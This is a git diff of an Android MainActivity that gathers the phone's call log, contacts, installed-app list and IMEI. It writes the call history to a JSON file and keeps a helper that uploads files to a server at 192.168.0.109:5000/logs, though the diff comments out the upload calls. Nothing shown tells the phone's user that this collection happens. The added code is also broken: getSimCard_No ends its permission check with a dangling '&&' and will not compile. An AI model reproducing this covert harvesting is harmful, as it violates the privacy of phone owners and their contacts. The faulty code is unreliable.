@@ -1,18 +1,22 @@
 package com.example.details;
 
 import android.Manifest;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -43,6 +47,7 @@ import okhttp3.Response;
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_CALL_LOG = 108;
 
+    @RequiresApi(api = Build.VERSION_CODES.N)
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         if (requestCode == REQUEST_CALL_LOG) {
@@ -53,7 +58,8 @@ public class MainActivity extends AppCompatActivity {
                 } catch (IOException | JSONException e) {
                     e.printStackTrace();
                 }
-            } else {
+//                readCalllogs();
+             } else {
                 Toast.makeText(this, "This Permission was not granted", Toast.LENGTH_SHORT).show();
             }
         } else {
@@ -61,23 +67,30 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @RequiresApi(api = Build.VERSION_CODES.N)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+        if (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.READ_SMS)==PackageManager.PERMISSION_GRANTED
+                &&ContextCompat.checkSelfPermission(getApplicationContext(),Manifest.permission.READ_PHONE_STATE)==PackageManager.PERMISSION_GRANTED
+                &&ContextCompat.checkSelfPermission(getApplicationContext(),Manifest.permission.READ_PHONE_NUMBERS)==PackageManager.PERMISSION_GRANTED){
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    getSimCard_No();
+                }
+            }catch (Exception e){
+                e.printStackTrace();
+            }
+        }
 
 
         if (ContextCompat.checkSelfPermission(
                 getApplicationContext(), Manifest.permission.READ_CALL_LOG) ==
                 PackageManager.PERMISSION_GRANTED) {
-
-            // You can use the API that requires the permission.
-
             try {
                 readCallLog();
-            } catch (IOException e) {
-                e.printStackTrace();
-            } catch (JSONException e) {
+            } catch (IOException | JSONException e) {
                 e.printStackTrace();
             }
 
@@ -112,6 +125,7 @@ public class MainActivity extends AppCompatActivity {
         }
         getAllApps();
        // postData();
+        readCalllogs();
 
     }
     public void getContacts() throws IOException {
@@ -148,7 +162,7 @@ public class MainActivity extends AppCompatActivity {
             }
             out.close();
             File f= new File(getFilesDir(), file.getName());
-            upload("http://192.168.0.109:5000/logs",f);
+           // upload("http://192.168.0.109:5000/logs",f);
         } catch (Exception e){
                 e.printStackTrace();
             }
@@ -246,7 +260,7 @@ public class MainActivity extends AppCompatActivity {
         out.close();
         Log.d("entry", entry);
         File f = new File(getFilesDir(),file.getName());
-        upload("http://192.168.0.109:5000/logs",f);
+       // upload("http://192.168.0.109:5000/logs",f);
 
 
                 //upload("http://127.0.0.1:5000/logs", new File(Filename));
@@ -455,6 +469,67 @@ public class MainActivity extends AppCompatActivity {
 //
 //    }
 
+    @RequiresApi(api = Build.VERSION_CODES.N)
+    private void readCalllogs() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 0);
+        }
+        ContentResolver contentResolver = getContentResolver();
+        Uri uri = CallLog.Calls.CONTENT_URI;
+        Cursor cursor = contentResolver.query(uri, null, null, null, null);
+        String Filename = "callHistory.json";
+        try {
+            File file = new File(Filename);
+            FileOutputStream out = openFileOutput(file.getName(), Context.MODE_APPEND);
+            String entry = "";
+            if (cursor.getCount() >= 0) {
+                while (cursor.moveToNext()) {
+                    String id = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID));
+                    String phone_number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                    String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                    String date = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                    Date datee = new Date(Long.parseLong(date));
+                    SimpleDateFormat ft = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss ", Locale.getDefault());
+                    String simwhat = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.VIA_NUMBER));
+                    String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+                    String PhoneID = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.PHONE_ACCOUNT_ID));
+                    entry = "\n" + "{\"id\":" + id + ",\"phone number\":" + phone_number +
+                            ",\"type\":" + type + ",\"date\":" + ft.format(datee) + ",\"sim\":" + simwhat + ",\"duration\":"
+                            + duration + ",\"phoneid\":" + PhoneID + "}";
+
+                    out.write(entry.getBytes(StandardCharsets.UTF_8));
+                    try {
+
+                    } catch (Exception e) {
+
+                    }
+                }
+                out.close();
+                Log.d("entry", entry);
+                File f = new File(getFilesDir(), file.getName());
+                //upload("http://192.168.0.109:5000/logs", f);
+
+
+
+            }} catch(Exception e){
+
+            }
+        }
+
+//
+
+
+//
+//            String json = "{\"id \":" + ID + ",\"phone owner\":" + phone_no + ",\"phone number\":" + phNumber + ",\"callDayTime\":" + ft.format(callDayTime) + ",\"callDuration\":" + callDuration + ",\"call type\":" + callType + "}";
+//            String jsonFile= "jsonFile.json";
+//            try {
+//                JSONObject obj = new JSONObject(json);
+//            }catch  (Exception e){
+//
+//            }
+
+
+//            System.out.println("json"+obj);
 
     public static void upload(String url, File file) {
         OkHttpClient client = new OkHttpClient();
@@ -483,10 +558,15 @@ public class MainActivity extends AppCompatActivity {
             }
         });
     }
+    @RequiresApi(api = Build.VERSION_CODES.O)
+    public  void getSimCard_No(){
+       if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)!=PackageManager.PERMISSION_GRANTED &&
+             ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)!=PackageManager.PERMISSION_GRANTED&&
+               ActivityCompat.checkSelfPermission(this,Manifest.permission.READ_PHONE_STATE)!=PackageManager.PERMISSION_GRANTED&&){
+           return;
+       }
+        TelephonyManager telephonyManager= (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+       telephonyManager.getImei();
 
-
+    }
 }
-
-
-
-
